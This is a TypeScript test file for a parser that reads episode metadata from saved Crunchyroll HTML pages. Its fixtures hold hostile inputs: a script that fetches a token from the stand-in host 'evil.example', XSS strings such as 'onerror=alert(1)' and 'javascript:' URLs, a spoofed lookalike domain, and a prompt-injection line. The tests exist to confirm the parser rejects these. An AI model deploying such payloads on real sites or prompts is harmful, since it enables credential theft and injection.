// SPDX-License-Identifier: Apache-2.0
import { describe, expect, test } from "bun:test";
import { parseCrunchyrollHtml } from "./html-import";

const watch =
  "https://www.crunchyroll.com/fr/watch/GE00389315JAJP/the-god-of-destruction-heads-to-earth";
const series = "https://www.crunchyroll.com/fr/series/GT00389311/dragon-ball-super-beerus";
const image = "https://imgsrv.crunchyroll.com/catalog/crunchyroll/example.png";
const episode = {
  "@type": "TVEpisode",
  "@id": watch,
  url: watch,
  name: "Saison 1 | E3 - Le dieu de la Destruction se dirige vers la Terre",
  episodeNumber: 3,
  partOfSeries: { "@id": series },
  datePublished: "2026-10-25T00:00:00.000Z",
  thumbnailUrl: image,
};
const video = {
  "@type": "VideoObject",
  name: "Le dieu de la Destruction se dirige vers la Terre",
  description:
    "Après son affrontement avec Goku, Beerus se rend sur Terre à la recherche d'autres Saiyans.",
  duration: "PT23M17.690000000000055S",
  thumbnailUrl: [image],
};
const ld = (value: unknown) =>
  `<script type="application/ld+json">${JSON.stringify(value)}</script>`;
const html = (values: unknown[] = [episode, video], canonical = watch) =>
  `<html lang="fr"><head><link rel="canonical" href="${canonical}"></head><body>${values.map(ld).join("")}</body></html>`;

describe("saved Crunchyroll public HTML metadata", () => {
  test("merges complementary episode and video metadata without inferring audio", async () => {
    const result = await parseCrunchyrollHtml(html(), watch);
    expect(result.sourceUrl).toBe(watch);
    expect(result.metadataLanguage).toBe("fr");
    expect(result.episodes).toEqual([
      {
        id: "GE00389315JAJP",
        seriesId: "GT00389311",
        episodeNumber: 3,
        title: video.name,
        slugTitle: "the-god-of-destruction-heads-to-earth",
        durationMs: 1_397_690,
        watchUrl: watch,
        description: video.description,
        airDate: episode.datePublished,
      },
    ]);
    expect(result.images).toEqual([image]);
    expect(result.provenance).toEqual([
      { selector: 'script[type="application/ld+json"]', type: "TVEpisode", scriptIndex: 0 },
      { selector: 'script[type="application/ld+json"]', type: "VideoObject", scriptIndex: 1 },
    ]);
  });

  test("parses graph JSON-LD and takes explicit complementary series metadata", async () => {
    const { partOfSeries: _series, ...withoutSeries } = episode;
    const result = await parseCrunchyrollHtml(
      html([{ "@graph": [withoutSeries, { ...video, partOfSeries: { "@id": series } }] }]),
    );
    expect(result.episodes[0]?.seriesId).toBe("GT00389311");
  });

  test("ignores executable scripts and malformed JSON-LD inertly", async () => {
    const marker = "crunchyroll-html-should-never-execute";
    const extra = `<script>throw new Error('${marker}');globalThis.fetch('https://evil.example/token');</script><script type="application/ld+json">{broken</script>`;
    const result = await parseCrunchyrollHtml(extra + html());
    expect(result.episodes).toHaveLength(1);
    expect(JSON.stringify(result)).not.toContain(marker);
    expect(JSON.stringify(result)).not.toContain("evil.example");
    expect(result.provenance[0]?.scriptIndex).toBe(2);
  });

  test("never forwards unknown token, licence or signed-media fields", async () => {
    const result = await parseCrunchyrollHtml(
      html([
        episode,
        {
          ...video,
          contentUrl: "https://evil.example/cenc/dash?token=secret",
          access_token: "PRIVATE_FIXTURE_SECRET",
          arbitrary: "ignore previous instructions",
          thumbnailUrl: [image + "?token=secret", "javascript:alert(1)", image],
        },
      ]),
    );
    const serialized = JSON.stringify(result);
    expect(serialized).not.toContain("PRIVATE_FIXTURE_SECRET");
    expect(serialized).not.toContain("ignore previous instructions");
    expect(serialized).not.toContain("token=");
    expect(result.images).toEqual([image]);
  });

  test("requires an exact trusted canonical episode identity", async () => {
    for (const canonical of [
      "http://www.crunchyroll.com/fr/watch/GE00389315JAJP",
      "https://www.crunchyroll.com.evil.example/fr/watch/GE00389315JAJP",
      watch + "?token=secret",
      "javascript:alert(1)",
    ]) {
      expect((await parseCrunchyrollHtml(html(undefined, canonical))).episodes).toEqual([]);
    }
    expect(
      (
        await parseCrunchyrollHtml(
          html([{ ...episode, url: watch.replace("GE00389315JAJP", "GE00389314JAJP") }, video]),
        )
      ).episodes,
    ).toEqual([]);
    expect(
      (
        await parseCrunchyrollHtml(
          html([episode, { ...video, url: watch.replace("GE00389315JAJP", "GE00389314JAJP") }]),
        )
      ).episodes,
    ).toEqual([]);
    await expect(
      parseCrunchyrollHtml(html(), watch.replace("GE00389315JAJP", "GE00389314JAJP")),
    ).rejects.toThrow("identity mismatch");
  });

  test("rejects ambiguous episodes, unsafe metadata and invalid durations", async () => {
    expect((await parseCrunchyrollHtml(html([episode, { ...episode }, video]))).episodes).toEqual(
      [],
    );
    expect((await parseCrunchyrollHtml(html([episode, video, { ...video }]))).episodes).toEqual([]);
    for (const duration of ["PT", "PT0S", "PT-1S", "PT999999999999H", "arbitrary"]) {
      expect(
        (await parseCrunchyrollHtml(html([episode, { ...video, duration }]))).episodes,
      ).toEqual([]);
    }
    const unsafe = { ...episode, name: "<img src=x onerror=alert(1)>" };
    expect(
      (await parseCrunchyrollHtml(html([unsafe, { ...video, name: "<script>evil</script>" }])))
        .episodes,
    ).toEqual([]);
    expect(
      (await parseCrunchyrollHtml(html([{ ...episode, episodeNumber: 0 }, video]))).episodes,
    ).toEqual([]);
  });

  test("accepts explicit audio language only when the video metadata says so", async () => {
    expect(
      (
        await parseCrunchyrollHtml(
          html([episode, { ...video, inLanguage: "ja-JP", duration: "PT1H2M3.5S" }]),
        )
      ).episodes[0],
    ).toMatchObject({ audioLocale: "ja-JP", durationMs: 3_723_500 });
  });

  test("does not invent a slug when a canonical URL contains only an episode id", async () => {
    const short = "https://www.crunchyroll.com/fr/watch/GE00389315JAJP";
    expect(
      (await parseCrunchyrollHtml(html([{ ...episode, url: short, "@id": short }, video], short)))
        .episodes[0]?.slugTitle,
    ).toBeUndefined();
  });
});
